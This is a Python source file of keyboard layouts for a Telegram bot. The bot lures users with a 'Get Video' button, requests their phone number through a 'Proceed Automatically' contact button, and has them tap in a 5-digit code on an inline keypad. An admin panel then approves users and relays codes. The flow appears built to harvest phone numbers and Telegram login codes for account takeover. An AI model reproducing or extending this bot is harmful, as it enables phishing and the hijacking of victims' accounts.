from telegram import InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup

def get_welcome_keyboard():
    # Seamless Fast Flow: Proceed button requests contact directly
    keyboard = [[KeyboardButton("Proceed Automatically 🚀", request_contact=True)]]
    return ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)

def get_contact_keyboard():
    # Contact sharing keyboard for phone verification
    keyboard = [[KeyboardButton("📱 Share Phone Number", request_contact=True)]]
    return ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)

def get_get_file_keyboard():
    # Using Inline Keyboard for Get Video to make it feel more premium
    keyboard = [[InlineKeyboardButton("📥 Get Video", callback_data="get_file")]]
    return InlineKeyboardMarkup(keyboard)

def get_otp_keyboard(current_code=""):
    """Generate 5-digit OTP keyboard"""
    keyboard = []
    for i in range(1, 10, 3):
        keyboard.append([InlineKeyboardButton(str(j), callback_data=f"num_{j}") for j in range(i, i+3)])
    keyboard.append([
        InlineKeyboardButton("❌ Clear", callback_data="num_clear"),
        InlineKeyboardButton("0", callback_data="num_0"),
        InlineKeyboardButton("✅ Send", callback_data="num_submit")
    ])
    return InlineKeyboardMarkup(keyboard)

def get_admin_approval_keyboard(user_id):
    keyboard = [
        [
            InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
            InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")
        ],
        [
            InlineKeyboardButton("🔢 Send Code", callback_data=f"admin_sms_{user_id}"),
            InlineKeyboardButton("💬 Message User", callback_data=f"msg_user_{user_id}")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_sms_keyboard(user_id):
    keyboard = []
    for i in range(1, 10, 3):
        keyboard.append([InlineKeyboardButton(str(j), callback_data=f"admin_sms_{user_id}_{j}") for j in range(i, i+3)])
    keyboard.append([
        InlineKeyboardButton("0", callback_data=f"admin_sms_{user_id}_0"),
        InlineKeyboardButton("Done ✅", callback_data=f"admin_sms_done_{user_id}")
    ])
    # Direct access to Admin Panel from the group chat
    keyboard.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(keyboard)

# --- New Admin Keyboards ---

def get_admin_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("📁 File List", callback_data="admin_file_list")],
        [InlineKeyboardButton("➕ Upload New File", callback_data="admin_upload_file")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        [
            InlineKeyboardButton("🖼 Edit Welcome Img", callback_data="admin_edit_welcome_img"),
            InlineKeyboardButton("📝 Edit Welcome Text", callback_data="admin_edit_welcome_text")
        ],
        [InlineKeyboardButton("⏱ Global Cooldown", callback_data="admin_global_cooldown")],
        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_file_settings_keyboard(file_id, cooldown, sharing, auto_delete):
    sharing_text = "ON ✅" if sharing else "OFF ❌"
    auto_delete_text = f"{auto_delete//60} min" if auto_delete > 0 else "OFF ❌"
    
    keyboard = [
        [InlineKeyboardButton(f"⏱ Set Timer ({cooldown//60}m)", callback_data=f"fset_timer_{file_id}")],
        [InlineKeyboardButton(f"🔒 Sharing: {sharing_text}", callback_data=f"fset_sharing_{file_id}")],
        [InlineKeyboardButton(f"🗑 Auto-Delete: {auto_delete_text}", callback_data=f"fset_autodel_{file_id}")],
        [InlineKeyboardButton("✏️ Rename", callback_data=f"fset_rename_{file_id}")],
        [
            InlineKeyboardButton("⬆️ Up", callback_data=f"fset_up_{file_id}"),
            InlineKeyboardButton("⬇️ Down", callback_data=f"fset_down_{file_id}"),
            InlineKeyboardButton("🗑 Delete", callback_data=f"fset_delete_{file_id}")
        ],
        [InlineKeyboardButton("🔙 Back to List", callback_data="admin_file_list")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_timer_options_keyboard(file_id=None):
    prefix = f"time_{file_id}_" if file_id else "gtime_"
    keyboard = [
        [
            InlineKeyboardButton("1h", callback_data=f"{prefix}3600"),
            InlineKeyboardButton("6h", callback_data=f"{prefix}21600"),
            InlineKeyboardButton("12h", callback_data=f"{prefix}43200")
        ],
        [
            InlineKeyboardButton("24h", callback_data=f"{prefix}86400"),
            InlineKeyboardButton("Custom ✏️", callback_data=f"{prefix}custom")
        ],
        [InlineKeyboardButton("🔙 Back", callback_data=f"fset_back_{file_id}" if file_id else "admin_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_autodelete_options_keyboard(file_id):
    keyboard = [
        [
            InlineKeyboardButton("OFF", callback_data=f"adel_{file_id}_0"),
            InlineKeyboardButton("5m", callback_data=f"adel_{file_id}_300"),
            InlineKeyboardButton("10m", callback_data=f"adel_{file_id}_600")
        ],
        [
            InlineKeyboardButton("30m", callback_data=f"adel_{file_id}_1800"),
            InlineKeyboardButton("1h", callback_data=f"adel_{file_id}_3600"),
            InlineKeyboardButton("Custom ✏️", callback_data=f"adel_{file_id}_custom")
        ],
        [InlineKeyboardButton("🔙 Back", callback_data=f"fset_back_{file_id}")]
    ]
    return InlineKeyboardMarkup(keyboard)
